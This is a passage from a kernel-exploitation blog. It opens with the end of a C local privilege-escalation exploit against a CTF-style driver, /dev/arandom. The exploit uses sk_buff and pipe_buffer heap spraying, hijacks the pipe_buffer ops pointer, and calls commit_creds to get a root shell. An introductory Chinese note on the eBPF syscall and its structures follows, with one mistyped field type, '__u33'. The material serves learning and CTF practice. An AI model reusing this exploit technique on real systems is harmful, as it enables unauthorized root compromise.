class="comment">//*(_QWORD *)((char *)buffer + v4 + 32) = &amp;get_random_bytes;</span></span><br><span class="line">  <span class="comment">//&#125;</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">  save_stat();</span><br><span class="line">  adjust_rlimit();</span><br><span class="line"></span><br><span class="line">  info(<span class="string">&quot;page size: %#lx\n&quot;</span>, page_size);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// INFO: Step 0x01: open device</span></span><br><span class="line">  step(<span class="string">&quot;open device&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd = check(open(<span class="string">&quot;/dev/arandom&quot;</span>, <span class="number">2</span>));</span><br><span class="line">  success(<span class="string">&quot;device open successfully\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  ioctl(fd, <span class="number">0x1004</span>, &amp;AAA);</span><br><span class="line">  info(<span class="string">&quot;arandom rand_size: %#x\n&quot;</span>, AAA.rand_size);</span><br><span class="line">  info(<span class="string">&quot;arandom rand_offset: %#x\n&quot;</span>, AAA.rand_offset);</span><br><span class="line">  info(<span class="string">&quot;arandom rand_value: %#x\n&quot;</span>, AAA.rand_value);</span><br><span class="line"></span><br><span class="line">  ioctl(fd, <span class="number">0x1001</span>); <span class="comment">// alloc</span></span><br><span class="line">  info(<span class="string">&quot;alloc buffer size: %#x\n&quot;</span>, AAA.rand_size);</span><br><span class="line"></span><br><span class="line">  check(ioctl(fd, <span class="number">0x1002</span>)); <span class="comment">// free</span></span><br><span class="line">  info(<span class="string">&quot;free buffer successfully\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint32_t</span> offset = AAA.rand_offset &amp; <span class="number">0xfff</span>;</span><br><span class="line">  info(<span class="string">&quot;page offset: %#x\n&quot;</span>, offset);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// INFO: Step 0x02: spray sk_buff</span></span><br><span class="line">  step(<span class="string">&quot;spray sk_buff&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOCKET_NUM 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SK_BUFF_NUM 10</span></span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> skb_reserve_size = <span class="number">320</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> skb_size = page_size - skb_reserve_size;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">  <span class="type">char</span> *skb_buf = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++) &#123;</span><br><span class="line">    check(socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]));</span><br><span class="line">    <span class="built_in">memset</span>(skb_buf, (<span class="type">char</span>)i, skb_size);</span><br><span class="line">    <span class="built_in">memcpy</span>(skb_buf, <span class="string">&quot;hamoood&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    <span class="built_in">memset</span>(skb_buf + offset, <span class="number">0</span>, <span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(skb_buf + offset, &amp;AAA.rand_value, <span class="number">0x4</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(skb_buf + offset + <span class="number">0x10</span>, &amp;AAA.rand_offset, <span class="number">0x4</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(skb_buf + offset + <span class="number">0x18</span>, &amp;AAA.rand_size, <span class="number">0x4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; ++j) &#123;</span><br><span class="line">      check(write(sk_sockets[i][<span class="number">0</span>], skb_buf, skb_size));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  success(<span class="string">&quot;spray sk_buff successfully\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// INFO: Step 0x03: check &amp; read sk_buff</span></span><br><span class="line">  step(<span class="string">&quot;check &amp; read sk_buff&quot;</span>);</span><br><span class="line">  <span class="type">char</span> *skb_recv = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">  check(ioctl(fd, <span class="number">0x1005</span>)); <span class="comment">// check</span></span><br><span class="line">  info(<span class="string">&quot;check buffer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  info(<span class="string">&quot;read sk_buff length %#x\n&quot;</span>, offset);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; ++j) &#123;</span><br><span class="line">      check(read(sk_sockets[i][<span class="number">1</span>], skb_recv, skb_size));</span><br><span class="line"></span><br><span class="line">      <span class="type">uint64_t</span> possible_addr = *(<span class="type">uint64_t</span> *)(skb_recv + offset + <span class="number">0x20</span>);</span><br><span class="line">      <span class="keyword">if</span> ((possible_addr &amp; <span class="number">0xffffffff00000000</span>) == <span class="number">0xffffffff00000000</span>) &#123;</span><br><span class="line">        success(<span class="string">&quot;find kernel addr at No.%d: %#lx\n&quot;</span>, i,</span><br><span class="line">                *(<span class="type">uint64_t</span> *)(skb_recv + offset + <span class="number">0x20</span>));</span><br><span class="line">        kernel_base = possible_addr - calc(<span class="number">0xffffffff81907850</span>);</span><br><span class="line">        success(<span class="string">&quot;find kernel base: %#lx\n&quot;</span>, kernel_base);</span><br><span class="line">        <span class="keyword">goto</span> FIND;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (kernel_base == <span class="number">0</span>) &#123;</span><br><span class="line">    err_exit(<span class="string">&quot;not found&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">FIND:</span><br><span class="line">  <span class="comment">// INFO: Step 0x04: spray pipe_buffer</span></span><br><span class="line">  step(<span class="string">&quot;spray pipe_buffer&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> *page;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">    <span class="type">void</span> *ops;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">  &#125; pipe_example;</span><br><span class="line"></span><br><span class="line">  pipe_example.page = (<span class="type">void</span> *)<span class="number">0xffffea0000000000</span>;</span><br><span class="line">  pipe_example.len = <span class="number">0x1000</span>;</span><br><span class="line">  pipe_example.offset = <span class="number">0x0</span>;</span><br><span class="line">  pipe_example.ops = (<span class="type">void</span> *)calc(<span class="number">0xffffffff8222bb80</span>);</span><br><span class="line">  pipe_example.ops = <span class="literal">NULL</span>;</span><br><span class="line">  pipe_example.flags = <span class="number">0x10</span>;</span><br><span class="line">  pipe_example.private = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> pipe_buffer_size = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer);</span><br><span class="line"></span><br><span class="line">  info(<span class="string">&quot;pipe_buffer size: %#lx\n&quot;</span>, pipe_buffer_size);</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> pipe_num = <span class="number">0x10</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> pipe_buf_size = page_size;</span><br><span class="line"></span><br><span class="line">  <span class="type">uint32_t</span> inner_pipe_offset = offset % pipe_buffer_size;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *pipe_buf = <span class="built_in">malloc</span>(pipe_buf_size);</span><br><span class="line">  <span class="type">int</span> pipe_fd[pipe_num][<span class="number">2</span>];</span><br><span class="line">  <span class="comment">// anon_pipe_buf_ops</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pipe_num; ++i) &#123;</span><br><span class="line">    check(pipe(pipe_fd[i]));</span><br><span class="line">    <span class="built_in">memset</span>(pipe_buf, i, pipe_buf_size);</span><br><span class="line">    <span class="built_in">memcpy</span>(pipe_buf, <span class="string">&quot;find__me&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    check(write(pipe_fd[i][<span class="number">1</span>], pipe_buf, pipe_buf_size));</span><br><span class="line">    check(fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">64</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">0x1</span>; ++j) &#123;</span><br><span class="line">      <span class="built_in">memset</span>(pipe_buf + <span class="number">0x8</span>, j, <span class="number">0x8</span>);</span><br><span class="line">      check(write(pipe_fd[i][<span class="number">1</span>], pipe_buf, <span class="number">0x1000</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  success(<span class="string">&quot;spray pipe_buffer successfully\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// INFO: Step 0x05: write random value</span></span><br><span class="line">  step(<span class="string">&quot;write random value&quot;</span>);</span><br><span class="line"></span><br><span class="line">  info(<span class="string">&quot;inner pipe offset: %#x\n&quot;</span>, inner_pipe_offset);</span><br><span class="line">  info(<span class="string">&quot;before writting:\n&quot;</span>);</span><br><span class="line">  dump_hex((<span class="type">char</span> *)&amp;pipe_example, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="type">char</span> *)(&amp;pipe_example) + inner_pipe_offset, &amp;AAA.rand_value, <span class="number">0x4</span>);</span><br><span class="line"></span><br><span class="line">  check(ioctl(fd, <span class="number">0x1003</span>)); <span class="comment">// write</span></span><br><span class="line">  info(<span class="string">&quot;write buffer+%#x &lt;- %#x\n&quot;</span>, AAA.rand_offset, AAA.rand_value);</span><br><span class="line"></span><br><span class="line">  info(<span class="string">&quot;after writting:\n&quot;</span>);</span><br><span class="line">  dump_hex((<span class="type">char</span> *)&amp;pipe_example, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *fake_ops = pipe_example.ops;</span><br><span class="line">  <span class="type">void</span> *fake_ops_page = (<span class="type">void</span> *)((<span class="type">uint64_t</span>)fake_ops &amp; <span class="number">0xFFFFFFFFFffff000</span>);</span><br><span class="line">  <span class="type">uint32_t</span> fake_ops_page_offset = ((<span class="type">uint64_t</span>)fake_ops &amp; <span class="number">0xfff</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (pipe_example.ops == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    err_exit(<span class="string">&quot;Useless write&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  success(<span class="string">&quot;affect pipe_buffer&#x27;s ops successfully\n&quot;</span>);</span><br><span class="line">  success(<span class="string">&quot;pipe_buffer&#x27;s ops: %p\n&quot;</span>, pipe_example.ops);</span><br><span class="line"></span><br><span class="line">  info(<span class="string">&quot;mmap page %p\n&quot;</span>, fake_ops_page);</span><br><span class="line">  <span class="type">void</span> *mmap_page = mmap(fake_ops_page, <span class="number">0x3000</span>, PROT_READ | PROT_WRITE,</span><br><span class="line">                         MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mmap_page != fake_ops_page) &#123;</span><br><span class="line">    err_exit(<span class="string">&quot;mmap error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// INFO: Step 0x06: close pipes</span></span><br><span class="line">  step(<span class="string">&quot;close pipes&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ffffffff812c8d40 T commit_creds</span></span><br><span class="line">  <span class="comment">// ffffffff812c8fd0 T prepare_kernel_cred</span></span><br><span class="line">  commit_creds = (<span class="type">void</span> *)calc(<span class="number">0xffffffff812c8d40</span>);</span><br><span class="line">  prepare_kernel_cred = (<span class="type">void</span> *)calc(<span class="number">0xffffffff812c8fd0</span>);</span><br><span class="line">  init_cred = (<span class="type">void</span> *)calc(<span class="number">0xffffffff82a54120</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span> win_addr = (<span class="type">uint64_t</span>)win;</span><br><span class="line">  info(<span class="string">&quot;win address: %#lx\n&quot;</span>, win_addr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x80</span>; ++i) &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(fake_ops + i * <span class="number">8</span>, &amp;win_addr, <span class="number">0x8</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pipe_num; ++i) &#123;</span><br><span class="line">    check(close(pipe_fd[i][<span class="number">0</span>]));</span><br><span class="line">    check(close(pipe_fd[i][<span class="number">1</span>]));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  shell();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    0xffffffff8170540b &lt;load_msg+59&gt;    call   0xffffffff81501210</span></span><br><span class="line"><span class="comment">    &lt;__kmalloc_node_noprof&gt;</span></span><br><span class="line"><span class="comment">    rdi: 0xa00</span></span><br><span class="line"><span class="comment">    rsi: 0xffff8880044512a0 &lt;- 0</span></span><br><span class="line"><span class="comment">    rdx: 0xcc0</span></span><br><span class="line"><span class="comment">    rcx: 0xffffffff</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/04/15/ebpf1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="NazrinDuck">
      <meta itemprop="description" content="Fâtih'in İstanbul'u fethettiği yaştasın!">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Blog de Назриндак">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/15/ebpf1/" class="post-title-link" itemprop="url">[Linux Kernel Pwn] eBPF 入门笔记（一）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2025-04-15 22:57:44" itemprop="dateCreated datePublished" datetime="2025-04-15T22:57:44+08:00">2025-04-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-26 01:36:25" itemprop="dateModified" datetime="2025-04-26T01:36:25+08:00">2025-04-26</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <!--toc:start-->

<ul>
<li><a href="#eBPF%E4%BB%8B%E7%BB%8D">eBPF介绍</a></li>
<li><a href="#eBPF%E5%9F%BA%E7%A1%80">eBPF基础</a><ul>
<li><a href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">基础知识</a></li>
<li><a href="#%E8%B0%83%E7%94%A8%E6%A8%A1%E6%9D%BF">调用模板</a></li>
<li><a href="#eBPF%E6%8C%87%E4%BB%A4">eBPF指令</a></li>
<li><a href="#eBPF%E6%8C%87%E4%BB%A4%E7%BC%96%E5%86%99">eBPF指令编写</a></li>
<li><a href="#Helper%E5%87%BD%E6%95%B0">Helper函数</a><!--toc:end--></li>
</ul>
</li>
</ul>
<h1 id="eBPF介绍"><a href="#eBPF介绍" class="headerlink" title="eBPF介绍"></a>eBPF介绍</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://ebpf.io/zh-hans/">eBPF</a> 是一项革命性的技术，起源于 Linux 内核，它可以在特权上下文中（如操作系统内核）运行沙盒程序。它用于安全有效地扩展内核的功能，而无需通过更改内核源代码或加载内核模块的方式来实现。</p>
</blockquote>
<p>历史上由BPF(伯克利包过滤器 Berkeley Packet Filter)发展而来（现在称为cBPF），直接在内核中运行特权代码，给予了Linux内核编程的极大的灵活性。<br>eBPF需要内核支持，用户可以通过一系列指令编写程序，在程序被加载后需要经过检验，验证通过后会通过JIT (Just-in-Time) 编译成机器码执行。</p>
<p>为了更加便捷，eBPF还支持在eBPF指令中直接调用函数(被称为Helper函数)。eBPF还提供map等数据结构用来与用户态之间传递信息；<br>在相关漏洞利用中，一般是想方法绕过严格的eBPF检验，通过漏洞混淆检验的过程，使得检验（模拟执行）结果和实际JIT编译运行结果不一致，从而造成安全漏洞，进一步转化为方便利用的类型。</p>
<blockquote>
<p>我们见到的沙箱题一般是用seccomp来实现的，而seccomp-bpf便是采用了BPF技术实现过滤系统调用</p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://docs.ebpf.io/">相关文档1</a> <a target="_blank" rel="noopener" href="https://docs.linuxkernel.org.cn/userspace-api/ebpf/syscall.html">相关文档2</a> Linux系统<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/include/uapi/linux/bpf.h#L77">另见<code>/usr/include/linux/bpf.h</code></a></p>
<blockquote>
<p>bpf设计相关，<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/Documentation/bpf/bpf_design_QA.rst">另见此</a></p>
</blockquote>
</blockquote>
<h1 id="eBPF基础"><a href="#eBPF基础" class="headerlink" title="eBPF基础"></a>eBPF基础</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><blockquote>
<p>本章的讨论环境基于Linux v6.13.7</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// in  /usr/include/asm/unistd_64.h</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_bpf 321</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>通过系统调用号为321的系统调用bpf可以使用eBPF相关功能。glibc并没有提供了包装函数，需要我们进行raw syscall:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/unistd_64.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">bpf</span><span class="params">(<span class="type">int</span> cmd, <span class="keyword">union</span> bpf_attr *attr, <span class="type">unsigned</span> <span class="type">int</span> size)</span> &#123;</span><br><span class="line">    syscall(__NR_bpf, cmd, attr, size);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>参数<code>int cmd</code>标识bpf的行为（类型应为enum bpf_cmd）。常用的有：<ul>
<li><code>BPF_PROG_LOAD</code> 用于加载并验证eBPF程序，写好了eBPF程序就用此参数上传。返回一个文件描述符（fd）以供使用。</li>
<li><code>BPF_MAP_CREATE</code> 用于创建一个eBPF map，以键值对（key-value）的形式存储数据。返回一个文件描述符（fd）以供使用。</li>
<li><code>BPF_MAP_LOOKUP_ELEM</code>与<code>BPF_MAP_UPDATE_ELEM</code>、<code>BPF_MAP_DELETE_ELEM</code>分别用来寻找、更新和删除map中的值（value）&#x2F;键值对（key&#x2F;value pair）</li>
<li><code>BPF_MAP_GET_NEXT_KEY</code>寻找map中的下一个键（key）</li>
<li><code>BPF_MAP_FREEZE</code> 冻结map的写权限（包括通过bpf调用实现的），此时检验（verifier）过程会将map中的值当作常数</li>
<li><code>BPF_PROG_TEST_RUN</code> 用于测试运行eBPF，测试用输入（data&#x2F;context）及输出在参数<code>union bpf_attr *attr</code>中给出</li>
<li>完整版<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/include/uapi/linux/bpf.h#L922">见此</a></li>
</ul>
</li>
<li>参数<code>unsigned int size</code>一般设置为<code>sizeof(attr)</code></li>
<li>参数<code>union bpf_attr *attr</code>根据<code>cmd</code>的不同有不同的格式，该参数类型为<code>union bpf_attr *</code>，为一个包含多种结构体的联合体指针。该类型<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/include/uapi/linux/bpf.h#L1462">完整原型</a>太长了，我们只看部分：（翻译并补充了部分注释）</li>
</ul>
<figure class="highlight c"><figcaption><span>bpf_attr</span><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/include/uapi/linux/bpf.h#L1462">完整版</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> &#123;</span></span><br><span class="line">...</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> &#123;</span> <span class="comment">/*用作BPF_MAP_CREATE命令的匿名结构体 */</span></span><br><span class="line">  __u32 map_type; <span class="comment">/* 枚举 bpf_map_type 中的一种 */</span></span><br><span class="line">  __u32 key_size; <span class="comment">/* key的大小（字节） */</span></span><br><span class="line">  __u32 value_size; <span class="comment">/* value的大小（字节） */</span></span><br><span class="line">  __u32 max_entries; <span class="comment">/* 一个map的最大入口数 */</span></span><br><span class="line">  __u32 map_flags; <span class="comment">/* BPF_MAP_CREATE 相关</span></span><br><span class="line"><span class="comment">      * flags 标志在上边定义</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">  __u32 inner_map_fd; <span class="comment">/* fd 指向内部map */</span></span><br><span class="line">  __u32 numa_node; <span class="comment">/* numa 节点 (仅在</span></span><br><span class="line"><span class="comment">      * BPF_F_NUMA_NODE 设置时有效).</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">        ...</span><br><span class="line"> &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span> <span class="comment">/* 用作BPF_MAP_*_ELEM命令的匿名结构体*/</span></span><br><span class="line">  __u32  map_fd; <span class="comment">// 传入BPF_MAP_CREATE命令创建的map返回的fd</span></span><br><span class="line">  __aligned_u64 key;</span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">   __aligned_u64 value;</span><br><span class="line">   __aligned_u64 next_key;</span><br><span class="line">  &#125;;</span><br><span class="line">  __u64  flags; <span class="comment">// flag值规定了对应命令的行为</span></span><br><span class="line"> &#125;;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> &#123;</span> <span class="comment">/* 用作BPF_PROG_LOAD命令的匿名结构体 */</span></span><br><span class="line">  __u32  prog_type; <span class="comment">/* 枚举 bpf_prog_type 中的一种 */</span></span><br><span class="line">  __u32  insn_cnt; <span class="comment">// 指令长度</span></span><br><span class="line">  __aligned_u64 insns; <span class="comment">// 传入指令的指针，事实上类型应该为struct bpf_insn **</span></span><br><span class="line">  __aligned_u64 license; <span class="comment">// 一般为&quot;GPL&quot;</span></span><br><span class="line">  __u32  log_level; <span class="comment">/* 检验报告的详细程度 */</span></span><br><span class="line">  __u32  log_size; <span class="comment">/* 用户缓冲区的大小 */</span></span><br><span class="line">  __aligned_u64 log_buf; <span class="comment">/* 用户提供的缓冲区 */</span></span><br><span class="line">  __u32  kern_version; <span class="comment">/* 没用 */</span></span><br><span class="line">        ...</span><br><span class="line"> &#125;;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span> <span class="comment">/* 用作BPF_PROG_TEST_RUN命令的匿名结构体 */</span></span><br><span class="line">  __u32  prog_fd; <span class="comment">// 传入BPF_PROG_LOAD命令创建的map返回的fd</span></span><br><span class="line">  __u32  retval;</span><br><span class="line">  __u32  data_size_in; <span class="comment">/* 输入: data_in的长度 */</span></span><br><span class="line">  __u32  data_size_out; <span class="comment">/* 输入/输出: data_out的长度</span></span><br><span class="line"><span class="comment">       *   返回 ENOSPC 如果 data_out</span></span><br><span class="line"><span class="comment">       *   太小了.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">  __aligned_u64 data_in;</span><br><span class="line">  __aligned_u64 data_out;</span><br><span class="line">  __u32  repeat;</span><br><span class="line">  __u32  duration;</span><br><span class="line">  __u32  ctx_size_in; <span class="comment">/* 输入: ctx_in的长度 */</span></span><br><span class="line">  __u33  ctx_size_out; <span class="comment">/* 输入/输出: ctx_out的长度</span></span><br><span class="line"><span class="comment">       *   返回 ENOSPC 如果 ctx_out</span></span><br><span class="line"><span class="comment">       *   太小了.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">  __aligned_u64 ctx_in;</span><br><span class="line">  __aligned_u64 ctx_out;</span><br><span class="line">  __u32  flags;</span><br><span class="line">  __u32  cpu;</span><br><span class="line">  __u32  batch_size;</span><br><span class="line"> &#125; test;</span><br><span class="line">...</span><br><span class="line">&#125; __attribute__((aligned(<span class="number">8</span>)));</span><br></pre></td></tr></table></figure>

<p>其中，<code>map_type</code>的枚举类型为<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/include/uapi/linux/bpf.h#L964"><code>enum bpf_map_type</code></a>，部分内容为：</p>
<figure class="highlight c"><figcaption><span>bpf_map_type</span><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/include/uapi/linux/bpf.h#L964">完整版</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">bpf_map_type</span> &#123;</span></span><br><span class="line"> BPF_MAP_TYPE_UNSPEC, <span class="comment">// 保留0作为无效类型</span></span><br><span class="line"> BPF_MAP_TYPE_HASH, <span class="comment">// 哈希表，key_size和value_size不受限制</span></span><br><span class="line"> BPF_MAP_TYPE_ARRAY, <span class="comment">// 数组，value_size不受限制，key_size限制为4（uint32）</span></span><br><span class="line"> BPF_MAP_TYPE_QUEUE, <span class="comment">// 队列，value_size不受限制，key_size限制为0（没有键）</span></span><br><span class="line"> BPF_MAP_TYPE_STACK, <span class="comment">// 栈，value_size不受限制，key_size限制为0（没有键），使用特有的Helper函数操作</span></span><br><span class="line"> ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>prog</code>的枚举类型为<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/include/uapi/linux/bpf.h#L1024"><code>enum bpf_prog_type</code></a>，部分内容为：</p>
